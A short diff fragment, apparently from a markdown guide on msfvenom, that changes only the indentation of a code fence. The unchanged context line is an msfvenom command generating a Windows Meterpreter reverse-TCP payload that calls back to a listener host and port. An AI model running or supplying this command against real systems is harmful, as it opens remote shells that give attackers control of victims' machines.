@@ -62,7 +62,7 @@ msfvenom --list encoders
 
 ### 2. Format Python:
 
-  ```
+   ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -o payload.py
    ```
 
